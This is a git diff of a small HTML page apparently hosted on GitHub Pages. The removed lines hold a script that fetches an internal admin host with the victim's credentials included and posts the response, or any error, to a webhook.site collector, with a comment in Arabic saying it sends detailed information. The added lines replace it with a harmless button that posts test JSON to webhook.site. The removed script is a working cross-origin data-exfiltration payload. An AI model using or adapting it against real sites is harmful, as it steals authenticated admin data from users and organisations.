@@ -1,25 +1,31 @@
-<script>
-fetch("http://admin.snagsolutions.io.localhost:3000", {
-  credentials: "include"
-})
-.then(res => res.text())
-.then(data => {
-  // إرسال معلومات مفصلة
-  fetch("https://webhook.site/3423f4fd-cd39-4111-9aae-0acdded09e53", {
-    method: "POST",
-    headers: {
-      "Content-Type": "text/plain"
-    },
-    body: "Response:\n" + data
-  });
-})
-.catch(err => {
-  fetch("https://webhook.site/3423f4fd-cd39-4111-9aae-0acdded09e53", {
-    method: "POST",
-    headers: {
-      "Content-Type": "text/plain"
-    },
-    body: "Error: " + err.message
-  });
-});
-</script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Webhook Test</title>
+</head>
+<body>
+  <h1>Send POST to webhook.site</h1>
+  <button id="sendBtn">Send POST</button>
+  <pre id="output"></pre>
+
+  <script>
+    document.getElementById('sendBtn').addEventListener('click', () => {
+      fetch('https://webhook.site/26a382d3-2924-4243-aa25-ba44f043c3ee', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ test: 'Hello from GitHub Pages' })
+      })
+      .then(response => response.text())
+      .then(data => {
+        document.getElementById('output').textContent = '✅ POST sent successfully!';
+      })
+      .catch(error => {
+        document.getElementById('output').textContent = '❌ Error: ' + error;
+      });
+    });
+  </script>
+</body>
+</html>
